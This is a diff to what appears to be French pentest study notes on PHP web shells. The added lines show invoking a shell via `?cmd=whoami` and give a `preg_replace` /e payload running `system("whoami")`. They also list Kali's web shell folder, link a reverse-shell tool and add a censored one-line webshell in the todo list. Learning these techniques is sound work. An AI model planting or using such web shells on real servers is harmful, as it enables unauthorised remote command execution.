@@ -46,6 +46,8 @@ La fonction `system` accepte la commande comme paramètre de la fonction, puis a
 
 Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. La commande dépendra du serveur (`dir` sur Windows ou `ls`Linux par exemple).
 
+Prends l'entrée de la commande dans l'URL : example.com/system.php?cmd=whoami
+
 #### exec
 
 ```php
@@ -135,6 +137,14 @@ echo "</pre>";
 ?>
 ```
 
+D'autres webshells sont disponibles dans votre Kali Linux : /usr/share/webshells/PHP
+
+#### preg\_replace
+
+```php
+<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
+```
+
 ## Information Disclosure
 
 ### Pré-requis
@@ -169,10 +179,16 @@ https://www.dynamicciso.com/web-shells-in-php-detection-and-prevention-part-1/
 
 [php-reverse-shell | pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 
+[Webshell &#xB7; Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html)
+
 ## Todo
 
 - Vérifier les fonctions définies en PHP
-- Faire un webshell avec proc\_open, pcntl\_exec ou eval(), preg\_match() avec le flag /e
+- Faire un webshell avec proc\_open, pcntl\_exec ou eval(), preg\_match() avec le flag /e, show\_source, asser() (
+  
+  ```
+  <?php @CENSORED($_POST['password']);?>)
+  ```
 - Ajouter les différents payloads avec les diférents extentsions de PHP
 - Vérifier qu'un paramètre est présent
 - 
